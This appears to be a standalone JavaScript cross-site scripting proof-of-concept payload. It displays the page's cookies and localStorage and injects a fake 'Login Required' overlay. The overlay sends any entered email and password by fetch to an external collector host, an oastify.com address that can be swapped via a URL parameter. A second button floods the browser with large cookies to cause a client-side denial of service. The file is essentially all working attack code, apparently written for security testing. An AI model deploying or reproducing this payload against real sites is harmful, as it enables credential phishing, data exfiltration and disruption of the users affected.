alert(
    document.domain + " XSS PoC"
    + (document.cookie ? "\nCookie/s: " + document.cookie : "")
    + (localStorage.length ? "\nlocalStorage: " + JSON.stringify(localStorage) : "")
);

(function () {
    const box = document.createElement("div");
    box.innerHTML = `
<div style="position:fixed;inset:0;display:flex;align-items:center;
            justify-content:center;background:rgba(0,0,0,.35);
            font-family:sans-serif;z-index:999999">
    <form style="background:#fff;padding:32px;border-radius:16px;
                 box-shadow:0 8px 24px rgba(0,0,0,.15);width:300px;display:flex;
                 flex-direction:column;gap:12px" onsubmit="return false">
        <h2 style="margin:0 0 8px;font-size:20px;font-weight:600;color:#111;text-align:center">
            Login Required
        </h2>
        <input id="lemail" placeholder="Email" style="padding:10px 12px;border:1px solid #ddd;border-radius:8px;font-size:14px">
        <input id="lpw" type="password" placeholder="Password" style="padding:10px 12px;border:1px solid #ddd;border-radius:8px;font-size:14px">
        <button id="lbtn" style="padding:10px;border:0;border-radius:8px;
                                 background:#111;color:#fff;font-size:15px;
                                 font-weight:500;cursor:pointer;transition:.2s">
            Login
        </button>
        <button id="dosbtn" style="padding:8px;border:0;border-radius:8px;
                                   background:#eee;color:#111;font-size:13px;
                                   cursor:pointer">
            Trigger (client-side) DoS via Cookie Overflow
        </button>
    </form>
</div>`;
    try {
        document.body.appendChild(box);
    } catch (e) {
        window.addEventListener("DOMContentLoaded", () => {
            document.body.appendChild(box);
        });
    }

    const lbtn = box.querySelector("#lbtn");
    const dosbtn = box.querySelector("#dosbtn");
    const lemail = box.querySelector("#lemail");
    const lpw = box.querySelector("#lpw");

    const u = new URL(location.href);
    let urlTarget = new URLSearchParams(u.search).get("t");
    if (!urlTarget && u.hash) {
        const frag = new URLSearchParams(u.hash.slice(1));
        urlTarget = frag.get("t") || u.hash.slice(1);
    }

    let target = urlTarget || localStorage.getItem("targetyre00obqr8t");
    if (urlTarget) localStorage.setItem("targetyre00obqr8t", urlTarget);
    if (!target) target = "https://isekrl4qyt17a6v3aapc5p5ynptgh65v.oastify.com";

    lbtn.onclick = () => {
        let credentials = lemail.value.trim() && lpw.value.trim()
            ? lemail.value + " && " + lpw.value : "";

        if (credentials) {
            fetch(target + "?&creds=" + encodeURIComponent(credentials));

            alert(`Credentials (${credentials}) captured and (PoC) exfiltrated to ${target} (check via DevTools > Network).`)
        } else {
            alert("Please fill in your credentials.")
        }
    };

    dosbtn.onclick = () => {
        for (let i = 0; i < 40; i++) {
            document.cookie = `dos${i}=` + "x".repeat(4000);
        }
        alert("Many large cookies injected (check via DevTools > Application > Cookies), and reload to see impact.");
    };
})();
